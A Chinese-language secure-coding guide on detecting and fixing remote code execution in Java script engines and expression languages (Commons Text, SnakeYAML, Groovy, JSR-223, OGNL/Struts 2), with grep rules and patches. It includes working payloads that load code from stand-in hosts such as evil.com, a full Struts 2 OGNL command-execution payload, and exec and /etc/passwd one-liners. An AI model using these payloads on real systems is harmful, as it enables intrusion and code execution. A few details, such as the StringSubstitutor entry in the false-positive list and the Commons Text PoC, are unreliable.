# Java 脚本引擎 & 表达式语言 RCE 检测模块

> Java生态边角RCE风险：脚本引擎、表达式语言隐式执行、文本插值

## 概述

Java生态中存在多种脚本引擎和表达式语言，这些组件在处理不受信任的输入时可能导致远程代码执行(RCE)。与主流的SpEL/OGNL相比，这些"边角"组件更容易被忽视，但同样危险。

**Critical级别风险**:
- Apache Commons Text String Interpolation
- SnakeYAML Constructor/loadAs 反序列化
- GroovyShell/GroovyScriptEngine 代码执行
- javax.script (JSR-223) 通用脚本引擎
- OGNL (Struts 2 老版本) 表达式注入

---

## 1. Apache Commons Text String Interpolation RCE

### 漏洞背景

**CVE-2022-42889** ("Text4Shell")
- 影响版本: Apache Commons Text 1.5 - 1.9
- CVSS: 9.8 (Critical)
- 类型: String Interpolation 代码执行

### 危险模式

```java
// ❌ Critical: StringSubstitutor with default lookups
import org.apache.commons.text.StringSubstitutor;

String template = request.getParameter("template");  // 用户输入
StringSubstitutor substitutor = StringSubstitutor.createInterpolator();
String result = substitutor.replace(template);  // RCE!

// Payload示例:
// ${script:javascript:java.lang.Runtime.getRuntime().exec('calc')}
// ${dns:attacker.com}
// ${url:http://evil.com/payload}
```

### 检测规则

```bash
# 1. 检测StringSubstitutor使用
grep -rn "StringSubstitutor" --include="*.java" -A 5 | grep -E "createInterpolator|replace"

# 2. 检测lookup配置
grep -rn "StringLookupFactory" --include="*.java" -A 3

# 3. 检测用户输入到interpolator
grep -rn "createInterpolator" --include="*.java" -B 10 | grep -E "request\.|getParameter|@RequestParam"

# 4. 检查pom.xml中的版本
grep -A 2 "commons-text" pom.xml | grep -E "<version>1\.[5-9]"
```

### 安全修复

```java
// ✓ 方案1: 禁用所有lookup
StringSubstitutor substitutor = new StringSubstitutor(
    StringLookupFactory.INSTANCE.mapStringLookup(Collections.emptyMap())
);

// ✓ 方案2: 仅启用安全lookup
Map<String, StringLookup> lookupMap = new HashMap<>();
lookupMap.put("env", StringLookupFactory.INSTANCE.environmentVariableStringLookup());
StringSubstitutor substitutor = new StringSubstitutor(
    StringLookupFactory.INSTANCE.mapStringLookup(lookupMap)
);

// ✓ 方案3: 升级到1.10.0+
<!-- pom.xml -->
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-text</artifactId>
    <version>1.10.0</version>  <!-- 已修复 -->
</dependency>
```

---

## 2. SnakeYAML Constructor RCE

### 漏洞背景

SnakeYAML默认允许构造任意Java对象，结合反序列化gadget chain可导致RCE。

**CVE-2022-1471** (SnakeYAML RCE)
- CVSS: 9.8 (Critical)
- 影响: SnakeYAML < 2.0

### 危险模式

```java
// ❌ Critical: 默认Yaml构造器
import org.yaml.snakeyaml.Yaml;

Yaml yaml = new Yaml();  // 默认Constructor，危险!
String input = request.getParameter("config");  // 用户输入
Object obj = yaml.load(input);  // RCE!

// ❌ Critical: loadAs with user-controlled type
Class<?> clazz = Class.forName(request.getParameter("type"));
yaml.loadAs(input, clazz);  // RCE!

// ❌ Critical: Constructor without SafeConstructor
Yaml yaml = new Yaml(new Constructor());  // 仍然危险
yaml.load(userInput);

// Payload示例:
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://evil.com/payload.jar"]
  ]]
]
```

### 检测规则

```bash
# 1. 检测new Yaml()默认构造
grep -rn "new Yaml()" --include="*.java" -A 3

# 2. 检测load()方法
grep -rn "\.load\s*(" --include="*.java" -B 5 | grep -E "Yaml|yaml"

# 3. 检测loadAs with dynamic class
grep -rn "\.loadAs\s*(" --include="*.java" -A 2 | grep "Class\.forName\|request\."

# 4. 检测Constructor usage
grep -rn "new Constructor(" --include="*.java" -A 2

# 5. 检查依赖版本
grep -A 2 "snakeyaml" pom.xml | grep -E "<version>(1\.|[^2])"
```

### 安全修复

```java
// ✓ 方案1: 使用SafeConstructor (推荐)
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

Yaml yaml = new Yaml(new SafeConstructor());
Object obj = yaml.load(input);  // 安全，仅允许基本类型

// ✓ 方案2: 自定义白名单Constructor
import org.yaml.snakeyaml.constructor.Constructor;

public class SafeYamlConstructor extends Constructor {
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.myapp.config.AppConfig",
        "com.myapp.model.User"
    );

    @Override
    protected Class<?> getClassForName(String name) throws ClassNotFoundException {
        if (!ALLOWED_CLASSES.contains(name)) {
            throw new IllegalArgumentException("Class not allowed: " + name);
        }
        return super.getClassForName(name);
    }
}

Yaml yaml = new Yaml(new SafeYamlConstructor());

// ✓ 方案3: 升级到2.0+ (Breaking changes)
<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>2.0</version>  <!-- 默认SafeConstructor -->
</dependency>

// ✓ 方案4: 使用loadFromReader限制类型
Yaml yaml = new Yaml();
try (Reader reader = new StringReader(input)) {
    MyConfig config = yaml.loadAs(reader, MyConfig.class);  // 显式指定类型
}
```

---

## 3. GroovyShell / Groovy ScriptEngine RCE

### 漏洞背景

Groovy是JVM上的动态语言，GroovyShell允许执行任意Groovy代码，用户输入直接执行极度危险。

### 危险模式

```java
// ❌ Critical: GroovyShell直接执行用户输入
import groovy.lang.GroovyShell;

String script = request.getParameter("script");  // 用户输入
GroovyShell shell = new GroovyShell();
Object result = shell.evaluate(script);  // RCE!

// ❌ Critical: GroovyScriptEngine
import groovy.util.GroovyScriptEngine;

GroovyScriptEngine engine = new GroovyScriptEngine(".");
String scriptName = request.getParameter("script");  // 路径可控
engine.run(scriptName, new Binding());  // 任意脚本执行

// ❌ Critical: Binding注入变量后执行
GroovyShell shell = new GroovyShell();
Binding binding = new Binding();
binding.setVariable("userInput", userInput);
shell.evaluate("println userInput.execute()", binding);  // 可执行命令

// Payload示例:
// "Runtime.getRuntime().exec('calc')"
// "new File('/etc/passwd').text"
// "'whoami'.execute().text"
```

### 检测规则

```bash
# 1. 检测GroovyShell实例化
grep -rn "new GroovyShell" --include="*.java" -A 5

# 2. 检测evaluate()调用
grep -rn "\.evaluate\s*(" --include="*.java" -B 10 | grep -E "GroovyShell|shell"

# 3. 检测GroovyScriptEngine
grep -rn "GroovyScriptEngine" --include="*.java" -A 3

# 4. 检测Groovy依赖
grep -A 2 "groovy-all\|groovy-" pom.xml

# 5. 检测用户输入到Groovy
grep -rn "\.evaluate\|\.run\s*(" --include="*.java" -B 10 | \
  grep -E "request\.|getParameter|@RequestParam"
```

### 安全修复

```java
// ✓ 方案1: 完全避免使用GroovyShell处理用户输入
// 使用配置文件、预定义脚本替代

// ✓ 方案2: 白名单预定义脚本
private static final Map<String, String> ALLOWED_SCRIPTS = Map.of(
    "calculate", "a + b",
    "format", "value.toUpperCase()"
);

String scriptKey = request.getParameter("script");
if (!ALLOWED_SCRIPTS.containsKey(scriptKey)) {
    throw new IllegalArgumentException("Script not allowed");
}

GroovyShell shell = new GroovyShell();
Binding binding = new Binding();
binding.setVariable("a", 10);
binding.setVariable("b", 20);
shell.evaluate(ALLOWED_SCRIPTS.get(scriptKey), binding);

// ✓ 方案3: Secure Groovy AST Transformations (高级)
import org.codehaus.groovy.control.CompilerConfiguration;
import org.codehaus.groovy.control.customizers.SecureASTCustomizer;

CompilerConfiguration config = new CompilerConfiguration();
SecureASTCustomizer customizer = new SecureASTCustomizer();

// 禁止危险操作
customizer.setDisallowedStatements(Arrays.asList(
    org.codehaus.groovy.ast.stmt.WhileStatement.class,
    org.codehaus.groovy.ast.stmt.ForStatement.class
));

// 禁止危险imports
customizer.setDisallowedImports(Arrays.asList(
    "java.lang.Runtime",
    "java.lang.Process",
    "java.io.File"
));

config.addCompilationCustomizers(customizer);
GroovyShell shell = new GroovyShell(config);

// ✓ 方案4: 使用沙箱 (Groovy Sandbox Plugin)
// 需要额外依赖，不在此详述
```

---

## 4. javax.script (JSR-223) 通用脚本引擎 RCE

### 漏洞背景

JSR-223提供了Java平台的通用脚本引擎API，支持JavaScript (Nashorn/GraalJS)、Groovy、JRuby、Jython等。用户控制脚本内容或引擎类型均可导致RCE。

### 危险模式

```java
// ❌ Critical: ScriptEngine执行用户脚本
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;

ScriptEngineManager manager = new ScriptEngineManager();
ScriptEngine engine = manager.getEngineByName("javascript");  // 或"nashorn"、"groovy"
String script = request.getParameter("expr");  // 用户输入
Object result = engine.eval(script);  // RCE!

// ❌ Critical: 用户控制引擎类型
String engineName = request.getParameter("engine");  // "groovy", "javascript"
ScriptEngine engine = manager.getEngineByName(engineName);
engine.eval("1+1");  // 看似安全，但用户可选groovy然后注入恶意代码

// ❌ Critical: Bindings注入后执行
ScriptEngine engine = manager.getEngineByName("nashorn");
Bindings bindings = engine.createBindings();
bindings.put("userInput", userInput);  // 用户输入
engine.eval("Java.type('java.lang.Runtime').getRuntime().exec(userInput)", bindings);

// Payload示例 (JavaScript/Nashorn):
// "java.lang.Runtime.getRuntime().exec('calc')"
// "Java.type('java.lang.ProcessBuilder')(['cmd','/c','calc']).start()"
// "load('http://evil.com/payload.js')"
```

### 检测规则

```bash
# 1. 检测ScriptEngineManager
grep -rn "ScriptEngineManager" --include="*.java" -A 5

# 2. 检测engine.eval()
grep -rn "\.eval\s*(" --include="*.java" -B 10 | grep -E "ScriptEngine|engine"

# 3. 检测getEngineByName
grep -rn "getEngineByName" --include="*.java" -A 3

# 4. 检测用户输入到eval
grep -rn "\.eval\s*(" --include="*.java" -B 15 | \
  grep -E "request\.|getParameter|@RequestParam"

# 5. 检测Nashorn引擎 (Java 8-14)
grep -rn "nashorn\|javascript.*engine" --include="*.java" -i

# 6. 检测GraalVM JS (Java 15+)
grep -A 2 "graalvm.*js\|org.graalvm.js" pom.xml
```

### 安全修复

```java
// ✓ 方案1: 避免使用ScriptEngine处理用户输入
// 使用Java原生逻辑、配置文件、DSL替代

// ✓ 方案2: 白名单表达式
private static final Map<String, String> ALLOWED_EXPRESSIONS = Map.of(
    "sum", "a + b",
    "multiply", "a * b"
);

String exprKey = request.getParameter("expr");
if (!ALLOWED_EXPRESSIONS.containsKey(exprKey)) {
    throw new IllegalArgumentException("Expression not allowed");
}

ScriptEngine engine = new ScriptEngineManager().getEngineByName("javascript");
Bindings bindings = engine.createBindings();
bindings.put("a", 10);
bindings.put("b", 20);
engine.eval(ALLOWED_EXPRESSIONS.get(exprKey), bindings);

// ✓ 方案3: 使用安全的表达式语言 (如JEXL with sandbox)
import org.apache.commons.jexl3.JexlBuilder;
import org.apache.commons.jexl3.JexlEngine;
import org.apache.commons.jexl3.JexlExpression;
import org.apache.commons.jexl3.introspection.JexlSandbox;

JexlSandbox sandbox = new JexlSandbox(false);  // 默认禁止一切
sandbox.allow("java.lang.Math");  // 仅允许Math类

JexlEngine jexl = new JexlBuilder()
    .sandbox(sandbox)
    .safe(true)
    .create();

JexlExpression expr = jexl.createExpression("Math.max(a, b)");
JexlContext context = new MapContext();
context.set("a", 10);
context.set("b", 20);
Object result = expr.evaluate(context);  // 安全

// ✓ 方案4: 迁移到GraalVM JS Context API (更安全)
import org.graalvm.polyglot.Context;
import org.graalvm.polyglot.Value;

Context context = Context.newBuilder("js")
    .allowAllAccess(false)  // 禁止访问Java类
    .build();

Value result = context.eval("js", "1 + 1");  // 受限环境
```

---

## 5. OGNL (Struts 2) 表达式注入

### 漏洞背景

OGNL (Object-Graph Navigation Language) 是Struts 2的核心表达式语言，历史上存在大量RCE漏洞。

**著名CVE**:
- CVE-2017-5638 (Struts2 RCE)
- CVE-2018-11776 (Namespace RCE)
- CVE-2019-0230 (Tag Attributes RCE)

### 危险模式

```java
// ❌ Critical: OGNL.getValue with user input
import ognl.Ognl;
import ognl.OgnlContext;

String expression = request.getParameter("expr");  // 用户输入
OgnlContext context = new OgnlContext();
Object result = Ognl.getValue(expression, context, new Object());  // RCE!

// ❌ Critical: Struts 2 action with dynamic expression
// struts.xml
<action name="*" class="com.example.DynamicAction">
    <result>/{1}.jsp</result>  // {1}可控，OGNL注入
</action>

// ❌ Critical: Struts 2 tag with user input
// JSP
<s:property value="%{userInput}" />  // OGNL表达式执行

// Payload示例:
// %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)
//   .(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])
//   .(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))
//   .(#ognlUtil.getExcludedPackageNames().clear())
//   .(#ognlUtil.getExcludedClasses().clear())
//   .(#context.setMemberAccess(#dm))))
//   .(#cmd='calc')
//   .(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))
//   .(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))
//   .(#p=new java.lang.ProcessBuilder(#cmds))
//   .(#p.redirectErrorStream(true)).(#process=#p.start())}
```

### 检测规则

```bash
# 1. 检测OGNL.getValue/setValue
grep -rn "Ognl\.getValue\|Ognl\.setValue" --include="*.java" -A 3

# 2. 检测OgnlContext
grep -rn "OgnlContext" --include="*.java" -A 5

# 3. 检测Struts 2版本
grep -A 2 "struts2-core" pom.xml | grep "<version>"

# 4. 检测struts.xml中的动态表达式
grep -rn "%{.*}" --include="struts.xml"

# 5. 检测JSP中的s:property
grep -rn "<s:property.*value=" --include="*.jsp"

# 6. 检测DevMode (开发模式，更危险)
grep -rn "struts.devMode.*true" --include="*.xml" --include="*.properties"
```

### 安全修复

```java
// ✓ 方案1: 升级Struts到最新版本
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>6.3.0</version>  <!-- 最新稳定版 -->
</dependency>

// ✓ 方案2: 禁用动态方法调用
// struts.xml
<constant name="struts.enable.DynamicMethodInvocation" value="false" />
<constant name="struts.mapper.alwaysSelectFullNamespace" value="false" />

// ✓ 方案3: 避免用户输入进入OGNL表达式
// 使用静态值或白名单

// ✓ 方案4: 输入验证和白名单
public class SafeOgnlWrapper {
    private static final Pattern SAFE_PATTERN = Pattern.compile("^[a-zA-Z0-9_\\.]+$");

    public static Object safeGetValue(String expression, Object root) {
        if (!SAFE_PATTERN.matcher(expression).matches()) {
            throw new IllegalArgumentException("Invalid OGNL expression");
        }
        // 只允许简单属性访问，不允许方法调用
        if (expression.contains("(") || expression.contains("@")) {
            throw new IllegalArgumentException("Method calls not allowed");
        }
        return Ognl.getValue(expression, root);
    }
}

// ✓ 方案5: 迁移到更安全的框架 (Spring MVC, Spring Boot)
```

---

## 综合检测清单

### Critical检测项 (立即修复)

- [ ] Apache Commons Text 1.5-1.9 使用`createInterpolator()`
- [ ] SnakeYAML默认`new Yaml()`处理用户输入
- [ ] SnakeYAML `loadAs()`动态类型加载
- [ ] GroovyShell.evaluate()执行用户脚本
- [ ] javax.script ScriptEngine.eval()执行用户输入
- [ ] OGNL.getValue()处理用户表达式
- [ ] Struts 2老版本 (< 6.0)

### High检测项 (计划修复)

- [ ] GroovyScriptEngine动态加载脚本文件
- [ ] ScriptEngineManager用户控制引擎类型
- [ ] Struts 2 DevMode开启
- [ ] JSP中`<s:property value="%{...}"/>`包含用户输入

### Medium检测项 (代码审查)

- [ ] Groovy Binding注入用户变量后执行预定义脚本
- [ ] ScriptEngine Bindings包含敏感对象
- [ ] OGNL表达式白名单验证不完整

---

## 修复优先级矩阵

| 组件 | 默认安全性 | 利用难度 | 修复成本 | 优先级 |
|------|-----------|---------|---------|--------|
| **Apache Commons Text** | ❌ 低 | 低 | 低 (升级) | **P0 - Critical** |
| **SnakeYAML** | ❌ 低 | 中 | 中 (Constructor改造) | **P0 - Critical** |
| **GroovyShell** | ❌ 低 | 低 | 高 (重构) | **P1 - High** |
| **javax.script** | ⚠️ 中 | 中 | 高 (重构) | **P1 - High** |
| **OGNL/Struts2** | ⚠️ 中 | 高 | 高 (迁移框架) | **P1 - High** |

---

## False Positive 场景

以下情况**不是**漏洞:
- ✅ StringSubstitutor使用SafeConstructor且无用户输入
- ✅ SnakeYAML使用SafeConstructor
- ✅ GroovyShell仅执行硬编码脚本，无用户输入
- ✅ ScriptEngine仅执行白名单表达式
- ✅ OGNL表达式完全静态，无动态部分
- ✅ Struts 2最新版本且禁用动态方法调用

---

## 最小 PoC 示例
```java
// Commons Text CVE-2022-42889
StringSubstitutor sub = new StringSubstitutor();
System.out.println(sub.replace("${script:javascript:java.lang.Runtime.getRuntime().exec('id')}"));

// SnakeYAML CVE-2022-1471
Yaml yaml = new Yaml();
yaml.load("!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://attacker/\"]]]]");
```

---

## 参考资料

- CVE-2022-42889: Apache Commons Text RCE
- CVE-2022-1471: SnakeYAML RCE
- Struts 2 Security Bulletins: https://struts.apache.org/security/
- JSR-223 Specification
- OWASP: Expression Language Injection
